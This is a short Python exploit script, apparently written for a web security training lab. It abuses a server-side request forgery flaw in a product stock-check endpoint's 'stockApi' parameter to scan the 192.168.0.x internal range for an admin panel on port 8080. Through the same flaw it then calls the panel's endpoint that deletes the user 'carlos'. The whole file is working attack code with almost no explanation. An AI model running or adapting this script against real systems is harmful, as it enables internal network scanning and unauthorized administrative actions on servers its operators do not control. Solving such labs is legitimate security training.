import requests
from urllib.parse import quote, unquote
from termcolor import colored

url=input("Input the Lab URL : ")
url=unquote(url)
url=url+"/product/stock"

IP="192.168.0."
for i in range(256):
    admin_url="http://" + IP + str(i) + ":8080/admin"
    print(admin_url, end=" | ")
    r=requests.post(url, data={'stockApi': admin_url})
    print(r.status_code)
    if (r.status_code==200):
        print(r.status_code)
        print(colored("[+] Portal Found at : "+ unquote(admin_url), "green"))
        break
        
#delete the user "carlos"
#will try to resolve or redirect to a private ip

delete_url=admin_url + "/delete?username=carlos"
r=requests.post(url, data={'stockApi': delete_url})